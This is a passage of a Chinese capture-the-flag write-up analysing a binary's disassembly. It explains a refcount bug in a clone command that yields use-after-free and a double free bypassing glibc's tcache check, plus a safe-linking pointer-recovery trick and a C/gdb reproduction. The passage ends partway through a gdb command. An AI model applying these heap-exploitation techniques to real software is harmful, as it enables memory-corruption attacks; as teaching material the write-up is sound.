write（0x1b40）}：\texttt{memcpy(slot.\allowbreak{}ptr,\allowbreak{}\ \allowbreak{}msg+4,\allowbreak{}\ \allowbreak{}n)}，但 \texttt{n}
被 \texttt{slot.\allowbreak{}size} 限制住
（\texttt{cmp\ \allowbreak{}WORD\ \allowbreak{}PTR\ \allowbreak{}{[}rdx+0x8{]},\allowbreak{}ax;\ \allowbreak{}jb\ \allowbreak{}錯誤}）⇒
單獨看\textbf{不是} heap overflow。

\textbf{\texttt{0x13} free（0x1ae8）}：

\begin{Verbatim}[breaklines=true,breakanywhere=true,breakautoindent=false,fontsize=\fontsize{7.0}{9.5}\selectfont]
    1b10: 49 8b 7d 00          mov    rdi,QWORD PTR [r13+0x0]   ; rdi = slot.ptr
    1b14: 48 85 ff             test   rdi,rdi
    1b17: 74 b7                je     1ad0                     ; 空的 -> 錯誤
    1b19: e8 e2 f5 ff ff       call   1100 <free@plt>          ; free(slot.ptr)
    1b1e: 66 41 83 6d 0a 01    sub    WORD PTR [r13+0xa],0x1   ; refcount--
    1b24: 75 0d                jne    1b33                     ; 還有引用 -> 「保留 ptr」
    1b26: 31 f6                xor    esi,esi
    1b28: 66 41 c7 45 08 00 00 mov    WORD PTR [r13+0x8],0x0   ; size = 0
    1b2f: 49 89 75 00          mov    QWORD PTR [r13+0x0],rsi  ; ptr  = NULL
\end{Verbatim}

\textbf{\texttt{0x14} clone（0x1a80）}：

\begin{Verbatim}[breaklines=true,breakanywhere=true,breakautoindent=false,fontsize=\fontsize{7.0}{9.5}\selectfont]
    1a90: 0f b6 54 24 31       movzx  edx,BYTE PTR [rsp+0x31]     ; A = msg[1]（目的，必須是空的）
    1a95: 0f b6 44 24 32       movzx  eax,BYTE PTR [rsp+0x32]     ; B = msg[2]（來源，必須非空）
    1ab1: 48 8b 30             mov    rsi,QWORD PTR [rax]         ; rsi = slot[B].ptr
    1ab4: 48 85 f6             test   rsi,rsi
    1ab7: 74 17                je     1ad0                        ; B 是空的 -> 錯誤
    1ac0: 48 83 39 00          cmp    QWORD PTR [rcx],0x0
    1ac4: 0f 84 94 03 00 00    je     1e5e                        ; A 是空的 -> 進複製
   ...
    1e5e: 0f b7 50 08          movzx  edx,WORD PTR [rax+0x8]       ; edx = slot[B].size
    1e62: 66 c7 41 0a 01 00    mov    WORD PTR [rcx+0xa],0x1      ; slot[A].refcount = 1  ←！！ 
    1e68: 48 89 31             mov    QWORD PTR [rcx],rsi         ; slot[A].ptr = slot[B].ptr
    1e6b: 66 83 40 0a 01       add    WORD PTR [rax+0xa],0x1      ; slot[B].refcount++    ←！！
    1e70: 66 89 51 08          mov    WORD PTR [rcx+0x8],dx       ; slot[A].size = slot[B].size
\end{Verbatim}

問題就在 \texttt{1e62} 與 \texttt{1e6b}：\textbf{兩個 slot
共用同一塊記憶體，卻各自保有自己的 refcount}。
這不是「共用計數」，而是「各自數自己的」⇒ 見第 4 節。

\paragraph{2.11 指令 0x15 與指令
0x16}\label{ux6307ux4ee4-0x15-ux8207ux6307ux4ee4-0x16}

\begin{Verbatim}[breaklines=true,breakanywhere=true,breakautoindent=false,fontsize=\fontsize{7.0}{9.5}\selectfont]
0000000000001a00 <cmd 0x15 handler>:
    1a00: 48 8d 74 24 31       lea    rsi,[rsp+0x31]            ; src = msg+1
    1a05: 0f b7 d2             movzx  edx,dx                     ; n = len-1
    1a08: b9 00 10 00 00       mov    ecx,0x1000                ; 目的大小 = 0x1000
    1a0d: 48 8d bc 24 30 10 00 00  lea rdi,[rsp+0x1030]         ; dest = rsp+0x1030
    1a15: 48 89 54 24 18       mov    [rsp+0x18],rdx            ; 存 n
    1a1a: 48 89 74 24 10       mov    [rsp+0x10],rsi            ; 存 src
    1a1f: e8 4c f7 ff ff       call   1170 <__memcpy_chk@plt>   ; 安全：n <= 0xfff 且 dest 有 0x1000
    1a24: 42 c6 84 3c 30 10 00 00  mov BYTE PTR [rsp+r15*1+0x1030],0x0  ; 補 '\0'
    1a2d: 4c 8d bc 24 30 20 00 00  lea r15,[rsp+0x2030]         ; 回應緩衝區
    1a35: 48 89 c7             mov    rdi,rax                    ; rdi = 字串位址
    1a38: ff 15 82 26 00 00    call   QWORD PTR [rip+0x2682]     # 40c0  ✶✶✶ 間接呼叫！
    1a3e: ba 15 00 00 00       mov    edx,0x15
    1a43: 48 8b 74 24 10       mov    rsi,[rsp+0x10]
    1a48: 48 8d bc 24 32 20 00 00  lea rdi,[rsp+0x2032]
    1a50: 66 89 94 24 30 20 00 00  mov WORD PTR [rsp+0x2030],dx ; 回應開頭 = 0x15, 0x00
    1a58: 48 8b 54 24 18       mov    rdx,[rsp+0x18]
    1a5d: b9 00 10 00 00       mov    ecx,0x1000
    1a62: e8 09 f7 ff ff       call   1170 <__memcpy_chk@plt>   ; 回音
    1a71: e8 9a fa ff ff       call   1510                      ; 加密送出
\end{Verbatim}

\texttt{0x1a38}
這一行就是全題的「鑰匙」：\textbf{它會用我們完全控制的字串當第一個參數，
去呼叫一個存在可寫 \texttt{.\allowbreak{}bss}（\texttt{0x40c0}）裡的函式指標}。

\begin{Verbatim}[breaklines=true,breakanywhere=true,breakautoindent=false,fontsize=\fontsize{7.0}{9.5}\selectfont]
0000000000001d08 <cmd 0x16 handler>:
    1d08: 66 0f 6f 05 b0 23 00 00  movdqa xmm0,[rip+0x23b0]  # 40c0
    1d10: 66 0f 6f 0d b8 23 00 00  movdqa xmm1,[rip+0x23b8]  # 40d0
    ... 共 15 個 16-byte 區塊 ...
    1d18: b8 16 00 00 00       mov    eax,0x16
    1d35: be f2 00 00 00       mov    esi,0xf2                  ; 送出 0xf2 = 242 bytes
    1d3a: 66 89 84 24 30 20 00 00  mov WORD PTR [rsp+0x2030],ax  ; 開頭 0x16, 0x00
    1d52: 0f 11 84 24 32 20 00 00  movups [rsp+0x2032],xmm0       ; -> 0x40c0 的內容
    ...
    1e12: e8 f9 f6 ff ff       call   1510                      ; 加密送出
\end{Verbatim}

送出 \texttt{0x40c0\ \allowbreak{}\textasciitilde{}\allowbreak{}\ \allowbreak{}0x41b0} 共 240
bytes，\textbf{第一個 8 bytes 就是 \texttt{{[}0x40c0{]}} =
\texttt{PIE+0x1390}} ⇒ 扣掉 \texttt{0x1390} 就是 \textbf{PIE
base}（這題的 leak 就是這麼簡單）。

\begin{center}\rule{0.5\linewidth}{0.5pt}\end{center}

\subsubsection{3. Stack canary 原理}\label{stack-canary-ux539fux7406}

\paragraph{3.1 它是什麼}\label{ux5b83ux662fux4ec0ux9ebc}

Canary 是放在「區域變數」與「返回位址」之間的一個 8-byte 隨機值（Linux
上最低位一定是 \texttt{\textbackslash{}\allowbreak{}0}，
所以用字串函式讀取時不會意外洩漏）。編譯器會這樣做：

\begin{Shaded}
\begin{Highlighting}[]
\BuiltInTok{mov}  \KeywordTok{rax}\OperatorTok{,} \DataTypeTok{qword} \DataTypeTok{ptr} \KeywordTok{fs}\OperatorTok{:}\BaseNTok{0x28}     \CommentTok{; 從 TLS（每個 thread 一份）讀出 canary}
\BuiltInTok{mov}  \DataTypeTok{qword} \DataTypeTok{ptr} \OperatorTok{[}\KeywordTok{rbp}\OperatorTok{{-}}\DecValTok{8}\OperatorTok{],} \KeywordTok{rax}     \CommentTok{; 存到 stack frame 裡}
\NormalTok{... 使用者程式碼 ...}
\BuiltInTok{mov}  \KeywordTok{rdx}\OperatorTok{,} \DataTypeTok{qword} \DataTypeTok{ptr} \OperatorTok{[}\KeywordTok{rbp}\OperatorTok{{-}}\DecValTok{8}\OperatorTok{]}     \CommentTok{; 要 return 前再讀出來}
\BuiltInTok{sub}  \KeywordTok{rdx}\OperatorTok{,} \DataTypeTok{qword} \DataTypeTok{ptr} \KeywordTok{fs}\OperatorTok{:}\BaseNTok{0x28}     \CommentTok{; 跟原始值比}
\ControlFlowTok{jne}\NormalTok{  \_\_stack\_chk\_fail           }\CommentTok{; 不一樣 ⇒ 有人覆蓋了 stack ⇒ abort}
\end{Highlighting}
\end{Shaded}

本題的實際指令（\texttt{0x1900} 這個大函式）：

\begin{Verbatim}[breaklines=true,breakanywhere=true,breakautoindent=false,fontsize=\fontsize{7.0}{9.5}\selectfont]
    1947: 64 48 8b 04 25 28 00 00 00  mov rax,QWORD PTR fs:0x28
    1950: 48 89 84 24 38 30 00 00     mov QWORD PTR [rsp+0x3038],rax   ; canary 放在 rsp+0x3038
    1e1c: 48 8b 84 24 38 30 00 00     mov rax,QWORD PTR [rsp+0x3038]   ; 要離開時讀回
    1e24: 64 48 2b 04 25 28 00 00     sub rax,QWORD PTR fs:0x28
    1e2d: 75 4a                       jne 1e79
    1e79: e8 c2 f2 ff ff              call 1140 <__stack_chk_fail@plt>
\end{Verbatim}

\paragraph{3.2 對解題的意義}\label{ux5c0dux89e3ux984cux7684ux610fux7fa9}

\begin{itemize}
\tightlist
\item
  想用「stack buffer overflow 覆蓋 return
  address」的話，\textbf{必須先洩漏 canary} 並在 payload
  中保持它不變（因為 \texttt{sub}/\texttt{jne} 是精確比對），否則
  \texttt{\_\allowbreak{}\_\allowbreak{}stack\_\allowbreak{}chk\_\allowbreak{}fail} 會讓程式 abort。
\item
  \textbf{本題完全不需要碰 canary}：所有可溢出/可寫的地方都寫不到
  canary，而且我們的攻擊路線是 「改函式指標」，不是「改返回位址」。
\item
  也順便驗證了本題\textbf{沒有} stack overflow 可利用：

  \begin{itemize}
  \tightlist
  \item
    \texttt{cmd\ \allowbreak{}0x15} 兩次 \texttt{\_\allowbreak{}\_\allowbreak{}memcpy\_\allowbreak{}chk} 的
    \texttt{n\ \allowbreak{}=\ \allowbreak{}len-\allowbreak{}1\ \allowbreak{}\textless{}\allowbreak{}=\ \allowbreak{}0xfff}， 而目的緩衝區
    \texttt{rsp+0x1030} 到 canary \texttt{rsp+0x3038} 之間有
    \texttt{0x1008} bytes，塞不爆。
  \item
    接收函式 \texttt{0x13f0} 也限制了
    \texttt{len\ \allowbreak{}\textless{}\allowbreak{}=\ \allowbreak{}0x1000}（\texttt{cmp\ \allowbreak{}si,\allowbreak{}0x1000;\ \allowbreak{}ja\ \allowbreak{}錯誤}）。
  \end{itemize}
\end{itemize}

\begin{center}\rule{0.5\linewidth}{0.5pt}\end{center}

\subsubsection{\texorpdfstring{3.5 \texttt{heap} 最小語彙：chunk / bin /
tcache / safe-linking（讀 §4
之前先看這段）}{3.5 heap 最小語彙：chunk / bin / tcache / safe-linking（讀 §4 之前先看這段）}}\label{heap-ux6700ux5c0fux8a9eux5f59chunk-bin-tcache-safe-linkingux8b80-4-ux4e4bux524dux5148ux770bux9019ux6bb5}

\begin{quote}
※ \textbf{入門指路}：想更完整地學 heap，請看 \texttt{wp/\allowbreak{}99\_\allowbreak{}速查表.\allowbreak{}md}
§8（迷你版）與 \texttt{../\allowbreak{}pwn4/\allowbreak{}notes.\allowbreak{}md} §5（完整版，含 gdb 實測的 heap
佈局表）。 這裡只講「讀 §4 一定用得到」的最小集合。
\end{quote}

\paragraph{\texorpdfstring{(1) chunk：\texttt{malloc}
給你的其實是一塊「有標頭」的記憶體}{(1) chunk：malloc 給你的其實是一塊「有標頭」的記憶體}}\label{chunkmalloc-ux7d66ux4f60ux7684ux5176ux5be6ux662fux4e00ux584aux6709ux6a19ux982dux7684ux8a18ux61b6ux9ad4}

\begin{Verbatim}[breaklines=true,breakanywhere=true,breakautoindent=false,fontsize=\fontsize{7.0}{9.5}\selectfont]
        ┌──────────────────────────┐ ← 低位址
        │ prev_size (8 bytes)      │  前一個 chunk 若「正在使用」，這格會被前一個借去當資料
        ├──────────────────────────┤
        │ size      (8 bytes)      │  ✶ 這塊的總大小（含標頭），例如 0x91
        ├──────────────────────────┤ ← ✶✶ P ＝ malloc() 回傳的位址（user data 起點）
        │ user data ...            │  程式與我們能寫的範圍
        └──────────────────────────┘
           chunk 標頭 = P - 0x10
\end{Verbatim}

\begin{itemize}
\tightlist
\item
  \texttt{malloc(0x80)} 真正拿到 \textbf{0x90} 的
  chunk：\texttt{0x80}（user）+ \texttt{0x10}（標頭）， size 固定 16
  對齊、\textbf{最小 0x20}。
\item
  size 的低 3 bits 是旗標（bit0 \texttt{PREV\_\allowbreak{}INUSE}、bit1
  \texttt{IS\_\allowbreak{}MMAPPED}、bit2 \texttt{NON\_\allowbreak{}MAIN\_\allowbreak{}ARENA}），
  要拿真正大小要寫 \texttt{size\ \allowbreak{}\&\allowbreak{}\ \allowbreak{}\textasciitilde{}\allowbreak{}0x7}。
\item
  \textbf{本筆記後面寫的 \texttt{P} 一律指「\texttt{malloc} 回傳的那個
  user 位址」}，不是 chunk 標頭； 標頭要自己算
  \texttt{P\ \allowbreak{}-\allowbreak{}\ \allowbreak{}0x10}。搞錯會差
  0x10，症狀是「程式沒崩、但攻擊目標沒被改到」。
\end{itemize}

\paragraph{\texorpdfstring{(2) \texttt{free} 之後：chunk 裡會被寫進
\texttt{next} /
\texttt{key}}{(2) free 之後：chunk 裡會被寫進 next / key}}\label{free-ux4e4bux5f8cchunk-ux88e1ux6703ux88abux5bebux9032-next-key}

\begin{Verbatim}[breaklines=true,breakanywhere=true,breakautoindent=false,fontsize=\fontsize{7.0}{9.5}\selectfont]
        ┌──────────────────────────┐
        │ prev_size / size         │
        ├──────────────────────────┤ ← P
        │ next (8 bytes)           │  ← ✶ 指向「下一塊同 size 的 free chunk」，
        │                          │     glibc 2.32+ 會把這個值**編碼**（見 (4)）
        ├──────────────────────────┤
        │ key  (8 bytes)           │  ← glibc 2.34+ 是隨機的 tcache_key
        ├──────────────────────────┤     （不是指標，所以洩漏不到 heap base）
        │ 舊資料（不會被清掉）     │  ← ✶ UAF 讀到的就是這些
        └──────────────────────────┘
\end{Verbatim}

\begin{itemize}
\tightlist
\item
  \texttt{free(p)} \textbf{不會}把變數 \texttt{p} 清成 NULL，所以「free
  過了、指標還在」= \textbf{use-after-free（UAF）}。
\item
  同一格欄位在不同 bin 有不同名字：tcache 叫
  \texttt{next}/\texttt{key}， unsorted/small/large bin 叫
  \texttt{fd}/\texttt{bk}，fastbin 只用
  \texttt{fd}。三個都對，不是衝突。
\end{itemize}

\paragraph{(3) bin 與 tcache：glibc
的「回收桶」}\label{bin-ux8207-tcacheglibc-ux7684ux56deux6536ux6876}

\begin{Verbatim}[breaklines=true,breakanywhere=true,breakautoindent=false,fontsize=\fontsize{7.0}{9.5}\selectfont]
  free(P) ──► tcache：每個 size 一條 LIFO 鏈，最多 7 塊（0x20…0x410 共 64 條）
                 │  滿了
                 ▼
              fastbin(<= 0x80) ──► unsorted bin ──► small bin / large bin
                                     │
                                     └─ ✶ fd/bk 指向 libc 裡的 main_arena → 洩漏 libc base
\end{Verbatim}

\begin{itemize}
\tightlist
\item
  size →
  鏈編號：\texttt{tc\_\allowbreak{}idx\ \allowbreak{}=\ \allowbreak{}(chunk\_\allowbreak{}size\ \allowbreak{}-\allowbreak{}\ \allowbreak{}0x20)\ \allowbreak{}/\allowbreak{}\ \allowbreak{}0x10}（\texttt{0x90\ \allowbreak{}→\ \allowbreak{}idx\ \allowbreak{}7}）。
\item
  \textbf{LIFO}：最後被 free 的，下一次 \texttt{malloc} 最先被拿回去。
\item
  管理這 64 條鏈的結構（\texttt{tcache\_\allowbreak{}perthread\_\allowbreak{}struct}）就在
  \textbf{heap 最開頭}， 它的 \texttt{entries{[}{]}}
  存的是\textbf{明文的 user 位址}（不用解碼）。
\item
  注意：\textbf{fastbin 沒有「7 塊」的上限}（7 是 tcache 的限制）。
\end{itemize}

\paragraph{\texorpdfstring{(4) safe-linking（glibc ≥
2.32）：\texttt{next}
會被加密}{(4) safe-linking（glibc ≥ 2.32）：next 會被加密}}\label{safe-linkingglibc-2.32next-ux6703ux88abux52a0ux5bc6}

\begin{Shaded}
\begin{Highlighting}[]
\PreprocessorTok{\#define PROTECT\_PTR}\OperatorTok{(}\PreprocessorTok{pos}\OperatorTok{,}\PreprocessorTok{ ptr}\OperatorTok{)}\PreprocessorTok{  }\OperatorTok{((}\PreprocessorTok{pos}\OperatorTok{)}\PreprocessorTok{ }\OperatorTok{\textgreater{}\textgreater{}}\PreprocessorTok{ }\DecValTok{12}\OperatorTok{)}\PreprocessorTok{ }\OperatorTok{\^{}}\PreprocessorTok{ }\OperatorTok{(}\PreprocessorTok{ptr}\OperatorTok{)}
\end{Highlighting}
\end{Shaded}

\begin{itemize}
\tightlist
\item
  \texttt{pos} ＝ \textbf{「存放這個指標的那一格」的位址}；在 tcache 裡
  \texttt{e\ \allowbreak{}=\ \allowbreak{}chunk2mem(p)}， 所以
  \texttt{pos\ \allowbreak{}=\ \allowbreak{}\&\allowbreak{}e-\allowbreak{}\textgreater{}\allowbreak{}next\ \allowbreak{}=\ \allowbreak{}e\ \allowbreak{}=\ \allowbreak{}P}（\textbf{user
  位址}）。
\item
  寫入：\texttt{stored\ \allowbreak{}=\ \allowbreak{}(P\ \allowbreak{}\textgreater{}\allowbreak{}\textgreater{}\allowbreak{}\ \allowbreak{}12)\ \allowbreak{}\^\allowbreak{}{}\allowbreak{}\ \allowbreak{}目標}；讀出：\texttt{目標\ \allowbreak{}=\ \allowbreak{}(P\ \allowbreak{}\textgreater{}\allowbreak{}\textgreater{}\allowbreak{}\ \allowbreak{}12)\ \allowbreak{}\^\allowbreak{}{}\allowbreak{}\ \allowbreak{}stored}。
\item
  編碼只用得到 \texttt{P\ \allowbreak{}\textgreater{}\allowbreak{}\textgreater{}\allowbreak{}\ \allowbreak{}12}（高位）⇒
  \textbf{攻擊者不需要知道完整位址}， 只要想辦法洩漏
  \texttt{P\ \allowbreak{}\textgreater{}\allowbreak{}\textgreater{}\allowbreak{}\ \allowbreak{}12} 就能偽造 \texttt{next}。
\item
  本題就是先靠「free 到空鏈」讀到
  \texttt{P\ \allowbreak{}\textgreater{}\allowbreak{}\textgreater{}\allowbreak{}\ \allowbreak{}12}，再用「P → P
  的自我參照環」把整個 \texttt{P} 解回來 （§4.3，含 gdb 實測）。
\end{itemize}

\begin{center}\rule{0.5\linewidth}{0.5pt}\end{center}

\subsubsection{4. 本題漏洞：refcount 算錯 ⇒ double free /
use-after-free}\label{ux672cux984cux6f0fux6d1erefcount-ux7b97ux932f-double-free-use-after-free}

\paragraph{4.1 為什麼會壞}\label{ux70baux4ec0ux9ebcux6703ux58de}

\texttt{clone}（指令 0x14）讓 \textbf{兩個 slot 指向同一塊 chunk}，但：

\begin{Verbatim}[breaklines=true,breakanywhere=true,breakautoindent=false,fontsize=\fontsize{7.0}{9.5}\selectfont]
1e62: mov WORD PTR [rcx+0xa],0x1     ; slot[A].refcount = 1     （← 重新設定成 1，不是「共用」）
1e6b: add WORD PTR [rax+0xa],0x1     ; slot[B].refcount++
\end{Verbatim}

⇒ 兩邊各自有一個獨立的計數器。於是：

\begin{Verbatim}[breaklines=true,breakanywhere=true,breakautoindent=false,fontsize=\fontsize{7.0}{9.5}\selectfont]
1. alloc 0 0x80                       -> slot0.ptr = P, slot0.rc = 1
2. clone 1 <- 0（A=1 空, B=0）         -> slot1.ptr = P, slot1.rc = 1, slot0.rc = 2
3. free 0                             -> free(P)  ⇒ P 進 tcache
                                         slot0.rc = 2-1 = 1 ≠ 0 ⇒ 「ptr 不設成 NULL」⇒ slot0 仍然指著 P！
4. write 0 <16 bytes>                 -> memcpy(P, ...)  ← 對「已釋放」的 chunk 寫 = UAF write
                                         剛好把 tcache 的 next(0..7) 和 key(8..15) 清成 0
5. free 1                             -> free(P) 再一次 ⇒ ✶ double free ✶
\end{Verbatim}

第 5 步為什麼不會被 glibc 的 double-free 偵測攔下來？glibc 2.29+ 在
\texttt{\_\allowbreak{}int\_\allowbreak{}free} 裡檢查：

\begin{Shaded}
\begin{Highlighting}[]
\NormalTok{tcache\_entry }\OperatorTok{*}\NormalTok{e }\OperatorTok{=}\NormalTok{ chunk2mem}\OperatorTok{(}\NormalTok{p}\OperatorTok{);}
\ControlFlowTok{if} \OperatorTok{(}\NormalTok{e}\OperatorTok{{-}\textgreater{}}\NormalTok{key }\OperatorTok{==}\NormalTok{ tcache}\OperatorTok{)} \OperatorTok{\{}          \CommentTok{/* 已經被放進 tcache 過？ */}
    \ControlFlowTok{for} \OperatorTok{(}\NormalTok{tmp }\OperatorTok{=}\NormalTok{ tcache}\OperatorTok{{-}\textgreater{}}\NormalTok{entries}\OperatorTok{[}\NormalTok{tc\_idx}\OperatorTok{];}\NormalTok{ tmp}\OperatorTok{;}\NormalTok{ tmp }\OperatorTok{=}\NormalTok{ tmp}\OperatorTok{{-}\textgreater{}}\NormalTok{next}\OperatorTok{)}
        \ControlFlowTok{if} \OperatorTok{(}\NormalTok{tmp }\OperatorTok{==}\NormalTok{ e}\OperatorTok{)}\NormalTok{ malloc\_printerr}\OperatorTok{(}\StringTok{"free(): double free detected in tcache 2"}\OperatorTok{);}
\OperatorTok{\}}
\end{Highlighting}
\end{Shaded}

它比對的是 \textbf{\texttt{e-\allowbreak{}\textgreater{}\allowbreak{}key} 這個欄位}（glibc ≥ 2.34
是隨機的 \texttt{tcache\_\allowbreak{}key}）。我們在第 4 步 \textbf{用 UAF write 把
\texttt{key} 清成 0}，所以
\texttt{e-\allowbreak{}\textgreater{}\allowbreak{}key\ \allowbreak{}!=\ \allowbreak{}tcache\_\allowbreak{}key}，檢查直接放行。

\paragraph{4.2
同時拿到三種能力}\label{ux540cux6642ux62ffux5230ux4e09ux7a2eux80fdux529b}

{\def\LTcaptype{none} % do not increment counter
\begin{longtable}[]{@{}
  >{\raggedright\arraybackslash}p{(\linewidth - 4\tabcolsep) * \real{0.3333}}
  >{\raggedright\arraybackslash}p{(\linewidth - 4\tabcolsep) * \real{0.3333}}
  >{\raggedright\arraybackslash}p{(\linewidth - 4\tabcolsep) * \real{0.3333}}@{}}
\toprule\noalign{}
\begin{minipage}[b]{\linewidth}\raggedright
能力
\end{minipage} & \begin{minipage}[b]{\linewidth}\raggedright
靠哪個指令
\end{minipage} & \begin{minipage}[b]{\linewidth}\raggedright
備註
\end{minipage} \\
\midrule\noalign{}
\endhead
\bottomrule\noalign{}
\endlastfoot
\textbf{UAF read}（洩漏 heap） & 0x11 read & slot0 還「以為」自己有
ptr，讀出來就是 tcache 的 \texttt{next}/\texttt{key} \\
\textbf{UAF write} & 0x12 write & 可以改 tcache 的 \texttt{next}（tcache
poisoning） \\
\textbf{double free} & 0x13 free & 讓同一個 chunk 在 tcache
裡出現（形成環狀串列） \\
\end{longtable}
}

\paragraph{4.3 safe-linking（glibc ≥
2.32）怎麼破}\label{safe-linkingglibc-2.32ux600eux9ebcux7834}

先把 \texttt{P} 定義清楚（\textbf{後面每一節都用這個定義}，請不要跟
chunk 標頭混用）：

\begin{Verbatim}[breaklines=true,breakanywhere=true,breakautoindent=false,fontsize=\fontsize{7.0}{9.5}\selectfont]
   P = cb.alloc() 之後 malloc() 回傳的那個位址      ✶ 就是「user data 起點」
   chunk 標頭 = P - 0x10
   （本題 CHUNK = 0x80 ⇒ malloc(0x80) ⇒ chunk size 0x90 ⇒ tcache idx 7）
\end{Verbatim}

glibc 從 2.32 起把 tcache/fastbin 的 \texttt{next} 指標\textbf{加密}：

\begin{Shaded}
\begin{Highlighting}[]
\PreprocessorTok{\#define PROTECT\_PTR}\OperatorTok{(}\PreprocessorTok{pos}\OperatorTok{,}\PreprocessorTok{ ptr}\OperatorTok{)}\PreprocessorTok{  }\OperatorTok{((}\PreprocessorTok{pos}\OperatorTok{)}\PreprocessorTok{ }\OperatorTok{\textgreater{}\textgreater{}}\PreprocessorTok{ }\DecValTok{12}\OperatorTok{)}\PreprocessorTok{ }\OperatorTok{\^{}}\PreprocessorTok{ }\OperatorTok{(}\PreprocessorTok{ptr}\OperatorTok{)}\PreprocessorTok{    }\CommentTok{/* pos = \&e{-}\textgreater{}next */}
\NormalTok{寫入時}\OperatorTok{:}\NormalTok{ stored }\OperatorTok{=} \OperatorTok{(}\NormalTok{pos }\OperatorTok{\textgreater{}\textgreater{}} \DecValTok{12}\OperatorTok{)} \OperatorTok{\^{}}\NormalTok{ ptr}
\NormalTok{讀取時}\OperatorTok{:}\NormalTok{ ptr    }\OperatorTok{=} \OperatorTok{(}\NormalTok{pos }\OperatorTok{\textgreater{}\textgreater{}} \DecValTok{12}\OperatorTok{)} \OperatorTok{\^{}}\NormalTok{ stored}
\end{Highlighting}
\end{Shaded}

因為 \texttt{e\ \allowbreak{}=\ \allowbreak{}chunk2mem(p)}，而 \texttt{next} 就位在 user data 的第
1 格，所以
\textbf{\texttt{pos\ \allowbreak{}=\ \allowbreak{}\&\allowbreak{}e-\allowbreak{}\textgreater{}\allowbreak{}next\ \allowbreak{}=\ \allowbreak{}e\ \allowbreak{}=\ \allowbreak{}P}（＝ malloc
回傳的 user 位址，不是 chunk 標頭）}。

\begin{quote}
※注意 \textbf{新手最容易錯的兩件事} 1. \textbf{拿
\texttt{P\ \allowbreak{}-\allowbreak{}\ \allowbreak{}0x10}（chunk 標頭）去 XOR。} 由於
\texttt{\textgreater{}\allowbreak{}\textgreater{}\allowbreak{}12} 丟掉低 12 bits， 只要 \texttt{P}
與 \texttt{P-\allowbreak{}0x10}
落在同一頁（絕大多數情況）算出來的值\textbf{剛好一樣}，
於是「看起來能動」；但如果 \texttt{P} 的位址低 12 bits 是
0（頁開頭）就會差 1， 而且觀念是錯的。\textbf{請一律用 \texttt{P}。} 2.
\textbf{把「攻擊目標」也當成 chunk。} \texttt{{[}0x40c0{]}}
這個函式指標\textbf{就是}那塊假 chunk 的 user data 起點，所以目標要填
\texttt{PIE+0x40c0}，\textbf{不是} \texttt{PIE+0x40d0}。 填成
\texttt{+0x40d0} 的症狀是：程式完全沒崩，但 \texttt{{[}0x40c0{]}}
還是原本的 stub （因為 \texttt{+0x40c0} 是 16 對齊，\texttt{aligned\_\allowbreak{}OK}
檢查也不會救你）。
\end{quote}

因為第 3\textasciitilde5 步造成 tcache 串列變成「P → P」的環，所以 P 的
\texttt{next} 會被寫成
\texttt{P\ \allowbreak{}\^\allowbreak{}{}\allowbreak{}\ \allowbreak{}(P\ \allowbreak{}\textgreater{}\allowbreak{}\textgreater{}\allowbreak{}\ \allowbreak{}12)}（自我參照！）。於是：

\begin{Verbatim}[breaklines=true,breakanywhere=true,breakautoindent=false,fontsize=\fontsize{7.0}{9.5}\selectfont]
P ^ (P >> 12) = leaked
\end{Verbatim}

這個方程式可以用\textbf{迭代法}解出來（低位 12 bits
不受影響，很快收斂）：

\begin{Shaded}
\begin{Highlighting}[]
\NormalTok{p }\OperatorTok{=}\NormalTok{ leaked}
\ControlFlowTok{for}\NormalTok{ \_ }\KeywordTok{in} \BuiltInTok{range}\NormalTok{(}\DecValTok{8}\NormalTok{):}
\NormalTok{    p }\OperatorTok{=}\NormalTok{ leaked }\OperatorTok{\^{}}\NormalTok{ (p }\OperatorTok{\textgreater{}\textgreater{}} \DecValTok{12}\NormalTok{)      }\CommentTok{\# 收斂後 p 就是 P（malloc 回傳的 user 位址）}
\end{Highlighting}
\end{Shaded}

\begin{quote}
小知識：glibc ≥ 2.34 的 \texttt{tcache\_\allowbreak{}entry.\allowbreak{}key} 不再是
\texttt{tcache} 指標，而是隨機值
\texttt{tcache\_\allowbreak{}key}，所以\textbf{不能}用它來洩漏
heap。這裡我們靠上面的自我參照式解出 P。
\end{quote}

\subparagraph{gdb 實測（題目附的 glibc
2.39，可照抄重現）}\label{gdb-ux5be6ux6e2cux984cux76eeux9644ux7684-glibc-2.39ux53efux7167ux6284ux91cdux73fe}

把本題的 heap 流程抽成最小的 C 程式（\texttt{free} → UAF 寫清 next/key →
再 \texttt{free} 一次）：

\begin{Shaded}
\begin{Highlighting}[]
\FunctionTok{cat} \OperatorTok{\textgreater{}}\NormalTok{ /tmp/tr2.c }\OperatorTok{\textless{}\textless{}\textquotesingle{}EOF\textquotesingle{}}
\StringTok{\#include \textless{}stdio.h\textgreater{}}
\StringTok{\#include \textless{}stdlib.h\textgreater{}}
\StringTok{\#include \textless{}string.h\textgreater{}}
\StringTok{int main(void)\{}
\StringTok{    void *P = malloc(0x80);}
\StringTok{    memset(P, \textquotesingle{}A\textquotesingle{}, 0x80);}
\StringTok{    free(P);                 /* line 7  : free \#1，tcache[0x90] 原本是空的 */}
\StringTok{    printf("state{-}a\textbackslash{}n");     /* line 8  ← 中斷點 1 */}
\StringTok{    memset(P, 0, 16);        /* line 9  : UAF write，把 next + key 清成 0 */}
\StringTok{    free(P);                 /* line 10 : free \#2 → 靜默的 double free */}
\StringTok{    printf("state{-}b\textbackslash{}n");     /* line 11 ← 中斷點 2 */}
\StringTok{    return 0;}
\StringTok{\}}
\OperatorTok{EOF}
\FunctionTok{gcc} \AttributeTok{{-}O0} \AttributeTok{{-}g} \AttributeTok{{-}o}\NormalTok{ /tmp/tr2 /tmp/tr2.c}
\FunctionTok{cp}\NormalTok{ /tmp/tr2 /tmp/tr2\_p            }\CommentTok{\# gdb 要載入題目的 2.39，所以先 patchelf}
\ExtensionTok{patchelf} \AttributeTok{{-}{-}set{-}interpreter} \StringTok{"}\VariableTok{$PWD}\StringTok{/ld{-}linux{-}x86{-}64.so.2"} \AttributeTok{{-}{-}set{-}rpath} \StringTok{"}\VariableTok{$PWD}\StringTok{"}\NormalTok{ /tmp/tr2\_p}

\FunctionTok{gdb} \AttributeTok{{-}q} \AttributeTok{{-}batch} \DataTypeTok{\textbackslash{}}
  \AttributeTok{{-}ex} \StringTok{\textquotesingle{}break /tmp/tr2.c:8\textquotesingle{}} \AttributeTok{{-}ex} \StringTok{\textquotesingle{}break /tmp/tr2.c:11\textquotesingle{}} \AttributeTok{{-}ex} \StringTok{\textquotesingle{}run\textquotesingle{}} \DataTypeTok{\textbackslash{}}
